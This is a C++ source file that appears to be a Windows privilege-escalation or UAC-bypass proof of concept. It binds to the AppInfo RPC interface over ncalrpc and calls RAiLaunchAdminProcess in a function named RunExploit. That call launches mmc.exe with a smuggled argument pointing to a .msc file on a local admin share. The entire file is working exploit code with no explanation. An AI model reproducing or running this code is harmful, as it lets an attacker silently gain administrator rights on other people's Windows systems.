#include "stdafx.h"
#include "rpc_h.h"
#pragma comment(lib, "rpcrt4.lib")
using namespace std;
RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE *binding_handle)
{
	RPC_STATUS status;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = {};
	RPC_WSTR StringBinding = nullptr;
	RPC_BINDING_HANDLE Binding;

	StringBinding = 0;
	Binding = 0;
	status = RpcStringBindingComposeW(L"201ef99a-7fa0-444c-9399-19ba84f12a1a", L"ncalrpc", 
		nullptr, nullptr, nullptr, &StringBinding);
	if (status == RPC_S_OK)
	{
		status = RpcBindingFromStringBindingW(StringBinding, &Binding);
		RpcStringFreeW(&StringBinding);
		if (!status)
		{
			SecurityQOS.Version = 1;
			SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
			SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
			SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

			status = RpcBindingSetAuthInfoExW(Binding, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
			if (!status)
			{
				v5 = Binding;
				Binding = 0;
				*binding_handle = v5;
			}
		}
	}

	if (Binding)
		RpcBindingFree(&Binding);
	return status;
}

extern "C" void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}

extern "C" void __RPC_USER midl_user_free(void __RPC_FAR * ptr)
{
	free(ptr);
}


void RunExploit()
{
	RPC_BINDING_HANDLE handle;
	RPC_STATUS status = CreateBindingHandle(&handle);

	struct Struct_14_t StructMember10 = {0,0};
	struct Struct_22_t StructMember0 = {L"StructMember0", 0, 0, 0, 0, 0, 0, 0, 0, 0, StructMember10};
	struct Struct_56_t Struct_56;
	long arg_12;

	Proc0_RAiLaunchAdminProcess(handle, L"C:\\Windows\\System32\\mmc.exe", L"XXX,wf.msc \"\\\\127.0.0.1\\C$\\gweeperx\\test.msc\"", 0x1, 0x00000400, L"D:\\", L"WinSta0\\Default", &StructMember0, 0, 0xffffffff, &Struct_56,&arg_12);
}

int main()
{
	RunExploit();
	
	return 0;
}

